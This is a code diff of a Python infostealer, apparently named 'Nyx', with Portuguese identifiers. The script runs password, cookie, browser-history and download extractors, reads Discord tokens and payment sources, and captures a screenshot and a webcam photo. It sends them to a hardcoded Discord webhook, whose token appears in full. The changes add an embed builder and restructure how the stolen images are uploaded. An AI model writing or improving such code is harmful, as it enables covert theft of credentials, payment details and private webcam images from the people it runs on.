@@ -10,7 +10,7 @@ from plugins.password import PasswordExtractor
 from plugins.downloads import BrowserDownloadsExtractor
 from plugins.history import BrowserDataExtractor
 from plugins.cookies import CookieExtractor
-from plugins.print import Sprint, save_image, get_image_bytes
+from plugins.print import Sprint, save_image
 from datetime import datetime
 
 DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284222512514727937/A08myURhvEgEJ2_76NX_gQa3vVr2ZG1VBiShR9_xRepZlpu-JxSQUe84vgWUzSxf9A3i'
@@ -31,9 +31,7 @@ def executar_comando(comando):
 
 def enviar_imagem_para_discord(caminho_foto):
     with open(caminho_foto, 'rb') as imagem:
-        files = {
-            'file': imagem
-        }
+        files = {'file': imagem}
         payload = {
             'username': webhook_username,
             'avatar_url': webhook_avatar,
@@ -149,6 +147,28 @@ def executar_cookie_extractor():
     except Exception as e:
         print(f"Erro ao executar CookieExtractor: {e}")
 
+def criar_embed_com_imagens(caminho_foto1, caminho_foto2):
+    return {
+        'title': 'Fotos',
+        'description': 'Capturas de tela e foto da webcam',
+        'color': 0xFF8C00,
+        'fields': [
+            {
+                'name': 'Screenshot',
+                'value': '![Screenshot](attachment://prtscr.png)',
+                'inline': True
+            },
+            {
+                'name': 'Foto da Webcam',
+                'value': '![Webcam](attachment://webcam.png)',
+                'inline': True
+            }
+        ],
+        'image': {
+            'url': 'attachment://webcam.png'
+        }
+    }
+
 if __name__ == "__main__":
     try:
         informacoes_sistema = obter_informacoes_sistema()
@@ -158,8 +178,12 @@ if __name__ == "__main__":
         webcam_foto = capture_photo()
         
         screenshot = Sprint()
-        screenshot_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Nyx', 'prtscr.png')
+        screenshot_path = os.path.join(pasta_nyx, 'prtscr.png')
+        webcam_path = os.path.join(pasta_nyx, 'webcam.png')
         save_image(screenshot, screenshot_path)
+
+        if webcam_foto:
+            save_image(webcam_foto, webcam_path)
 
         user_info_instance = UserInfos()
         user_info = user_info_instance.get_user_info()
@@ -210,31 +234,19 @@ if __name__ == "__main__":
                 payment_sources = discord_info.get_payment_sources(token)
                 if payment_sources:
                     discord_embed['description'] += f"\nCartões de crédito: {len(payment_sources)}"
-                else:
-                    discord_embed['description'] += "\nNenhum cartão de crédito registrado"
-
-                subscriptions = discord_info.get_nitro_subscription(token)
-                if subscriptions:
-                    for sub in subscriptions:
-                        renew_timestamp = sub.get("current_period_end")
-                        if renew_timestamp:
-                            expiration_date = datetime.fromtimestamp(renew_timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
-                            discord_embed['description'] += f"\nNitro expira em: {expiration_date}"
-                        else:
-                            discord_embed['description'] += "\nNitro ativo, mas sem data de expiração disponível"
-
+                
                 enviar_para_discord('', embed=discord_embed)
 
+        enviar_imagem_para_discord(screenshot_path)
+        enviar_imagem_para_discord(webcam_path)
+
+        embed_imagens = criar_embed_com_imagens(screenshot_path, webcam_path)
+        enviar_para_discord('', embed=embed_imagens)
+        
         executar_password_extractor()
         executar_browser_downloads()
         executar_browser_history()
         executar_cookie_extractor()
 
-        if webcam_foto:
-            enviar_imagem_para_discord(webcam_foto)
-
-        if os.path.exists(screenshot_path):
-            enviar_imagem_para_discord(screenshot_path)
-
     except Exception as e:
-        print(f"Erro geral: {e}")
+        print(f"Erro no script principal: {e}")
